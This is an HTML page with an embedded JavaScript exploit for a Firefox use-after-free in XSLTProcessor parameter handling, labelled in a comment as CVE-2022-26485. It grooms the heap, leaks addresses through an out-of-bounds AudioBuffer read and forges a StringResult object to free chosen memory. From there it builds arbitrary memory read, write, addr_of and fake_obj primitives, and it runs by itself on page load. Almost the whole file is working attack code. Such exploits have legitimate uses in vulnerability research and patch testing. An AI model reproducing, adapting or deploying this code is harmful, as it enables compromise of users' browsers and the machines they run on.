<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<link rel="icon" href="data:," />
<title>exploit</title>
<script>

const xml_data = '<?xml version="1.0" encoding="UTF-8"?><abc></abc>';

const xslt_data0 = '<?xml version="1.0" encoding="UTF-8"?>' +
'<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">' +
'</xsl:stylesheet>';

const xslt_data1 = '<?xml version="1.0" encoding="UTF-8"?>' +
'<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">' +
'<xsl:output method="xml" indent="yes" />' + 
'<xsl:param name="param1" />' +
'<xsl:param name="param2" />' +
'<xsl:param name="param3" />' +
'<xsl:template match="/">' +
'    <xsl:value-of select="$param1" />' +
'    <xsl:value-of select="$param2" />' +
'    <xsl:value-of select="$param1" />' +
'    <xsl:value-of select="$param3" />' +
'</xsl:template>' + 
'</xsl:stylesheet>';


const xslt_data2 = '<?xml version="1.0" encoding="UTF-8"?>' +
'<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">' +
'<xsl:output method="xml" indent="yes" />' + 
'<xsl:param name="param1" />' +
'<xsl:param name="param2" />' +
'<xsl:param name="param3" />' +
'<xsl:template match="/">' +
'    <xsl:value-of select="$param1" />' +
'    <xsl:value-of select="$param2" />' +
'    <xsl:value-of select="$param3" />' +
'</xsl:template>' + 
'</xsl:stylesheet>';

const txVariable_size = 32;
const StringResult_size = 40;

var ab1 = null;
let ab1_u64 = null;

var ab2 = null;

var source2 = null;
var buffer2 = null;
var buffer3 = null;

var alloc_count = 0;

var parser = new DOMParser();
var xml = parser.parseFromString(xml_data, "text/xml");
var xslt0 = parser.parseFromString(xslt_data0, "text/xml");
var xslt1 = parser.parseFromString(xslt_data1, "text/xml");
var xslt2 = parser.parseFromString(xslt_data2, "text/xml");
var xslt_processor0 = new XSLTProcessor();
var xslt_processor1 = new XSLTProcessor();
var xslt_processor2 = new XSLTProcessor();

function hex(val) {
    let result = "0x" + val.toString(16);
    return result;
}

function log(msg = "\n") {
    window.dump(msg + "\n");
    console.log(msg);
}

function print_arr(arr) {
    let arr_u64 = new BigUint64Array(arr);
    log("\n");
    for(let i = 0; i < arr_u64.length; i++) {
        let u64_val = arr_u64[i];
        log(hex(u64_val));
    }
}

function garbage_collect() {
    for(let i = 0; i < 3; i++) {
        new ArrayBuffer(128 * 1024 * 1024);
    }
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function sleep_sync(ms) {
   let current_time = new Date().getTime();
   while (current_time + ms >= new Date().getTime()) {
   }
}

Object.defineProperty(BigInt.prototype, "lo", {
    get: function() {
        let lo = this & 0xFFFFFFFFn;
        return Number(lo);
    }
});
Object.defineProperty(BigInt.prototype, "hi", {
    get: function() {
        let hi = (this >> 32n) & 0xFFFFFFFFn;
        return Number(hi);
    }
});

function make_addr(lo, hi) {
    hi = BigInt(hi);
    lo = BigInt(lo);
    let result = ((hi << 32n) | lo);
    return result;
}

function tag_obj(addr) {
    let result = (0x1FFFCn << 47n) | addr;
    return result;
}

function untag_val(val) {
    let result = val & (1n << 47n)-1n;
    return result;
}


// StringResult:
// - vtable
// - mRefCnt (0)
// - mRecycler (null)
// - mValue
//    - mData
//    - mLength
//    - mDataFlags
//    - mClassFlags
function build_str_result(vtable, data) {
    let arr = new ArrayBuffer(StringResult_size);
    let u32_arr = new Uint32Array(arr);
    
    u32_arr[0] = vtable.lo;
    u32_arr[1] = vtable.hi;
    u32_arr[2] = 0;         //mRefCnt
    u32_arr[3] = 0;
    u32_arr[4] = 0;         //mRecycler
    u32_arr[5] = 0;
    u32_arr[6] = data.lo;
    u32_arr[7] = data.hi;
    
    const TERMINATED = (1 << 0);
    const OWNED = (1 << 3);
    const NULL_TERMINATED = (1 << 1);
    const mDataFlags = TERMINATED | OWNED;
    const mClassFlags = NULL_TERMINATED;
    u32_arr[8] = 0; //size
    u32_arr[9] = (mClassFlags << 16) | mDataFlags;
    
    return arr;
}

function find_next_val(arr, val, begin = 0) {
    let result = -1;
    for(let i = begin; i < arr.length; i++) {
        if(arr[i] == val) {
            result = i;
            break;
        }
    }
    return result;
}

function unicode_str(arr) {
    let str = "";
    let u16_arr = new Uint16Array(arr);
    for(let i = 0; i < u16_arr.length; i++) {
        str += String.fromCodePoint(u16_arr[i]);
    }
    return str;
}

//We do not control the last 2 bytes which are used as a null terminator
function alloc(arr) {
    let str = unicode_str(arr);
    //We don't want the allocation for the parameter name to fall within our desired size.
    //So we make the name get allocated from another size class.
    xslt_processor0.setParameter(null, "a".repeat(512) + "lloc" + alloc_count, str);
    alloc_count++;
}

var next_c = 0;
//CVE-2022-26485 
function install_primitives() {
    ab1 = new ArrayBuffer(8);
    new Uint8Array(ab1).fill(0x11);
    ab2 = new ArrayBuffer(8);
    ab2.obj = 0x1337;
    new Uint8Array(ab2).fill(0x22);
    
    garbage_collect();

    let audio_ctx = new OfflineAudioContext(3, 1, 44100);
    
    let leak_capacity = 0x1000;
    let source0 = new AudioBufferSourceNode(audio_ctx, {channelCount: 3});
    let buffer0 = audio_ctx.createBuffer(3, leak_capacity, audio_ctx.sampleRate);
    buffer0.copyToChannel(new Float32Array([0]), 0);

    //extend lifetime so double free doesn't happen
    source2 = new AudioBufferSourceNode(audio_ctx, {channelCount: 3});
    buffer2 = audio_ctx.createBuffer(15, leak_capacity, audio_ctx.sampleRate);
    buffer2.copyToChannel(new Float32Array([0]), 0);

    xslt_processor0.reset();
    xslt_processor0.importStylesheet(xslt0);
    xslt_processor1.reset();
    xslt_processor1.importStylesheet(xslt2);
        
    let obj2 = {
        toString : function() {
            xslt_processor1.removeParameter(null, "param1");
            source0.buffer = buffer0;
            //this load bearing setParameter call prevents
            //the url path from being allocated in our desired hole
            //for js_f32_arr_addr. Wtf???
            xslt_processor1.setParameter(null, "param1", 1);
            return "fugazi";
        }
    };
    let obj3 = {
        toString : function() {        
            //control this size to leak adresseses from different pow2 sized chunks
            //unfortunately the string size gets rounded up to nearest pow2
            
            //change the string each time or otherwise sometimes  
            //js_f32_arr_addr and arr_of_bufs_addr can point to the same address.
            //Wtf: is this some kind of string interning ???
            let result = String.fromCharCode(0x42 + next_c++).repeat((128 - 8-2)/2);
            return result;
        }
    };
    
    //reclaim existing free holes for the given size classes (32, 48, 128)
    let fill_i = 0;
    let fill_count = 512;
    for(; fill_i < fill_count; fill_i++) {
        xslt_processor0.setParameter(null, "fill32_" + fill_i, "a".repeat((txVariable_size - 2)/2));
        xslt_processor0.setParameter(null, "fill48_" + fill_i, "b".repeat((StringResult_size - 2)/2));
        xslt_processor0.setParameter(null, "fill128_" + fill_i, "c".repeat((128 - 2)/2));
    }
    xslt_processor1.setParameter(null, "param1", obj2);
    xslt_processor1.setParameter(null, "param2", obj3);
    xslt_processor1.setParameter(null, "param3", obj3);
    
    xslt_processor1.transformToDocument(xml);
            
    //we don't want to read OOB on an unmapped page so we read less than a page size
    //could probably be more rygorous about this regarding the actual size value...
    //could probably make this robust by measuring the location of StringResult object
    //in relation to it's run. The leak could be achieved by allocating a ImageData object...
    let leak_size = 1024;
    let leak_arr = new ArrayBuffer(leak_size);
    let leak_f32 = new Float32Array(leak_arr);
    let leak_u64 = new BigUint64Array(leak_arr);
    buffer0.copyFromChannel(leak_f32, 1);
        
    let vtable_addr = leak_u64[0];
    
    //Search for this locations of the 2 StringResults (from param2, param3) that follow the 
    //first StringResult (param1). We do this dynamically rather than using fixed offsets
    //as the locations seems to vary somtimes. We use the vtable as a marker to search for.
    let found0_pos = 0;
    let found1_pos = find_next_val(leak_u64, vtable_addr, found0_pos+1);
    console.assert(found1_pos != -1, "couldn't find first StringResult");
    let arr_of_bufs_addr = leak_u64[found1_pos+3] - 8n;
    
    let found2_pos = find_next_val(leak_u64, vtable_addr, found1_pos+1);
    console.assert(found2_pos != -1, "couldn't find second StringResult");
    let js_f32_arr_addr = leak_u64[found2_pos+3] - 8n;
    
    //advance mRegionsMinElement for the 128 size class
    for(let i = 0; i < 64; i++) { 
        xslt_processor0.setParameter(null, "fill128_" + fill_i++, "d".repeat((128 - 2)/2));
    }
    //free the 128 byte sized allocation and reclaim it with an array of buffers
    xslt_processor1.removeParameter(null, "param2");
    source2.buffer = buffer2;
    
    //advance mRegionsMinElement for the 128 size class
    for(let i = 0; i < 128; i++) { 
        xslt_processor0.setParameter(null, "fill128_" + fill_i++, "e".repeat((128 - 2)/2));
    }
    //free the 128 byte sized allocation and reclaim it with an array of Float32Array's
    //reclaimation of this allocation doesn't seem 100% reliable. 
    //TODO: allocate more arrays of Float32Arrays...
    xslt_processor1.removeParameter(null, "param3");
    buffer3 = audio_ctx.createBuffer(15, 0xFFFFF / 4, audio_ctx.sampleRate);
    let f32_arr = buffer3.getChannelData(0);
    //Move the Float32Array's to the Tenured heap
    garbage_collect();

    //do all debug printing afterwards to not interfere with freeing and allocing
    log("\n");
    for(let i = 0; i < Math.min(128, leak_u64.length); i++) {
        let u64_val = leak_u64[i];
        //log(hex(u64_val));
        window.dump(hex(u64_val) + "\n");
    }
    log("\n");
    
    log("vtable_addr " + hex(vtable_addr));
    log("js_f32_arr_addr (pos=" + found1_pos + ") " + hex(js_f32_arr_addr));
    log("arr_of_bufs_addr (pos=" + found2_pos + ") " + hex(arr_of_bufs_addr));
    log("\n");

    //do this check after debug printing so we still have useful
    //information in that case of failure
    if(vtable_addr == 0 || found1_pos == -1 || found2_pos == -1) {
        return false;
    }
    
    function free(free_addr, callback = null) {
        xslt_processor1.reset();
        xslt_processor1.importStylesheet(xslt1);
        xslt_processor2.reset();
        let obj4 = {
            toString : function() { 
                xslt_processor1.removeParameter(null, "dummy1");
                xslt_processor1.removeParameter(null, "dummy2");
                xslt_processor1.removeParameter(null, "param1"); //free txVariable
                xslt_processor2.importStylesheet(xslt0); //reclaim txVariable with a txNodeTest object
                return "fugazi";
            } //overwrite member of txNodeTest with StringResult pointer
        };
        let obj5 = {
            toString : function() {
                //setParameter (used by alloc) has the side effect of allocating a 
                //XPCTraceableVariant. Even though XPCTraceableVariant (88 bytes) is 
                //in a different size class to StringResult (40 bytes) there is one 
                //rare case where every allocation in the 48 byte sized run is freed, 
                //leaving the run memory avaialable to reclaimed by other size classes.
                //See "run recycling" //https://news.sophos.com/en-us/2019/04/18/protected-cve-2018-18500-heap-write-after-free-in-firefox-analysis-and-exploitation/
                
                //To prevent this we allocate an extra 40 bytes size allocation (dummy3) 
                //before freeing the StringResult. This (hopefully) will mean that the 
                //48 sized run will always have at least one allocation and won't be 
                //avaialable for reclaimation by allocations from other size classes.
            
                xslt_processor1.setParameter(null, "dummy3", "i".repeat((StringResult_size - 2)/2));
                let fake_str_result = build_str_result(vtable_addr, free_addr);
                xslt_processor2.reset(); //free the corrupted txNodeTest and in turn the StringResult
                
                for(let i = 0; i < 64; i++) {
                    alloc(fake_str_result); //reclaim StringResult with faker
                }
                return "fugazi";
            }
            //Our fake StringResult contains the address we want to free.
            //Eventually it will be freed when "param1" is accessed again in
            //txValueOf::execute(txExecutionState& aEs).
            //The fake StringResult gets accessed as RefPtr
            //RefPtr<txAExprResult> exprRes;
            //So we change the reference count to be zero so that the fake
            //StringResult (and owned string) gets freed once txValueOf::execute
            //returns.
        };
        
        let obj6 = {
            toString : function() {
                callback();
                return "fugazi";
            }
        };
        //reclaim existing free holes for the given size classes (32, 48, 128)
        let fill_count = fill_i + 128;
        for(; fill_i < fill_count; fill_i++) {
            xslt_processor0.setParameter(null, "fill32_" + fill_i, "f".repeat((txVariable_size - 2)/2));
            xslt_processor0.setParameter(null, "fill48_" + fill_i, "g".repeat((StringResult_size - 2)/2));
            xslt_processor0.setParameter(null, "fill128_" + fill_i, "h".repeat((128 - 2)/2));
        }
        xslt_processor1.setParameter(null, "dummy1", 0);
        xslt_processor1.setParameter(null, "dummy2", 0);
        xslt_processor1.setParameter(null, "param1", obj4);
        xslt_processor1.setParameter(null, "param2", obj5);
        xslt_processor1.setParameter(null, "param3", (callback) ? obj6 : 1);
        xslt_processor1.transformToDocument(xml);
    }
    
    //read primitive works by freeing the array of buffer pointers
    //and reclaiming it with our fake array containing the read
    //address of our choosing in the first array element [0].
    function read(addr, size) {
        let fake_arr = new ArrayBuffer(128);
        let u32_arr = new Uint32Array(fake_arr);
        u32_arr[0] = 15;
        u32_arr[1] = (8 << 28) | 15;
        u32_arr[2] = addr.lo;
        u32_arr[3] = addr.hi;
        fake_arr = fake_arr.slice(0, fake_arr.byteLength-2);
        
        free(arr_of_bufs_addr, () => {
            for(let i = 0; i < 64; i++) {
                alloc(fake_arr);
            }
        });
        let read_arr = new ArrayBuffer(size);
        let read_f32 = new Float32Array(read_arr);
        buffer2.copyFromChannel(read_f32, 0);
        
        return read_arr;
    }
    //So we can pass Nursery checks...
    f32_arr[0xFFFE8 / 4] = 1.4013e-45; //1
    
    //for our temporary addr_of primitive
    f32_arr.obj = ab1; 
    
    //read the array of Float32Array objects
    let js_f32_arr = read(js_f32_arr_addr, 128);
    let js_f32_arr_u64 = new BigUint64Array(js_f32_arr);
    let js_obj_addr = js_f32_arr_u64[1];
    print_arr(js_f32_arr);
        
    //read the contents of the first Float32Array in the array
    let js_obj = read(js_obj_addr, 64);
    let js_obj_u64 = new BigUint64Array(js_obj);
    let js_obj_f32 = new Float32Array(js_obj);
    let f32_backing_store = js_obj_u64[7];
    let slots_addr = js_obj_u64[2];
    print_arr(js_obj);
    
    //Modify the Float32Array by overwrite the backing store 
    //with the address of the its own property slots. We will use this for 
    //getting the address of the ab1 JSObject.
    js_obj_u64[7] = slots_addr;
    //Copy the contents of the modified Float32Array into it'd own backing store.
    //This will be where we create our fake Float32Array from.
    buffer3.copyToChannel(js_obj_f32, 0);
    
    //overwrite element [1] of the array of Float32Array objects
    //with the address of our to-be-created fake Float32Array.
    js_f32_arr_u64[2] = f32_backing_store;
    //crap we need to do because we don't control the last 2 bytes
    js_f32_arr_u64[15] = 0n;
    js_f32_arr = js_f32_arr.slice(0, js_f32_arr.byteLength-2);
    
    //overwrite the array of Float32Array objects
    //with our fake array
    log("freeing " + hex(js_f32_arr_addr));
    free(js_f32_arr_addr, () => {
        for(let i = 0; i < 64; i++) {
            alloc(js_f32_arr);
        }
    });
    
    //read the contents of the slots array using our 
    //fake Float32Array object
    let read_arr = new ArrayBuffer(8);
    let read_u64 = new BigUint64Array(read_arr);
    let read_f32 = new Float32Array(read_arr);
    buffer3.copyFromChannel(read_f32, 1);

    //Change the backing store of our fake Float32Array to point
    //to the length field of ab1
    let ab1_addr = untag_val(read_u64[0]);
    let ab1_len_addr = ab1_addr + 40n;
    log("ab1_addr " + hex(ab1_addr));
    js_obj_u64[7] = ab1_len_addr;
    buffer3.copyToChannel(js_obj_f32, 0);
    
    //Overwrite the length field of ab1 with a larger value
    //so it can access the contents of ab2
    let fake_f32_arr = buffer3.getChannelData(1)
    fake_f32_arr[0] = 1.34525e-43; //0x60
    fake_f32_arr = null;
    
    ab1_u64 = new BigUint64Array(ab1);
    
    //cleanup by removing the fake_f32_arr
    let patch_addr = js_f32_arr_addr + 0x10n;
    write_u64(patch_addr, 0n);
         
    return true;
}
function pwn() {
    let success = false;
    for(let retry = 0; retry < 5; retry++) {
        if(install_primitives()) {
            success = true;
            break;
        }
    }
    if(!success) {
        log("EXPLOIT FAILED");
        return;
    }
    let addr = addr_of({});
    log();
    log("addr " + hex(addr));

}


function fake_obj(addr) {
    let tagged_addr = tag_obj(addr);
    
    let ab2_slots_ = ab1_u64[6];
    write_u64(ab2_slots_, tagged_addr);
            
    let result = ab2.obj;
    
    ab2.obj = null;
    
    return result;
}

function addr_of(obj) {
    ab2.obj = obj;
    
    let ab2_slots_ = ab1_u64[6];
    let addr = read_u64(ab2_slots_);
    
    let result = untag_val(addr);
    
    ab2.obj = null;
    
    return result;
}

function read_u8(addr) {
    if(addr instanceof Number) {
        addr = BigInt(addr);
    }
    ab1_u64[8] = addr;
    
    let view = new Uint8Array(ab2);
    let result = view[0];

    return result;
}

function read_u16(addr) {
    if(addr instanceof Number) {
        addr = BigInt(addr);
    }
    ab1_u64[8] = addr;
    
    let view = new Uint16Array(ab2);
    let result = view[0];

    return result;
}

function read_u32(addr) {
    if(addr instanceof Number) {
        addr = BigInt(addr);
    }
    ab1_u64[8] = addr;
    
    let view = new Uint32Array(ab2);
    let result = view[0];

    return result;
}

function read_u64(addr) {
    if(addr instanceof Number) {
        addr = BigInt(addr);
    }
    ab1_u64[8] = addr;
    
    let view = new BigUint64Array(ab2);
    let result = view[0];
        
    return result;
}

function write_u8(addr, val) {
    if(addr instanceof Number) {
        addr = BigInt(addr);
    }
    ab1_u64[8] = addr;
    
    let view = new Uint8Array(ab2);
    view[0] = val;
}

function write_u32(addr, val) {
    if(addr instanceof Number) {
        addr = BigInt(addr);
    }
    ab1_u64[8] = addr;
    
    let view = new Uint32Array(ab2);
    view[0] = val;
}

function write_u64(addr, val) {
    if(addr instanceof Number) {
        addr = BigInt(addr);
    }
    if(val instanceof Number) {
        val = BigInt(val);
    }
    ab1_u64[8] = addr;
    
    let view = new BigUint64Array(ab2);
    view[0] = val;
}

function break_prog() {
    Math.cos(1);
    //alert(0); //nsCycleCollector_collectSlice
}
window.onload = pwn;
//pwn();
</script>
</head>
<body>
<button onclick="break_prog()">break</button>
</body>
</html>
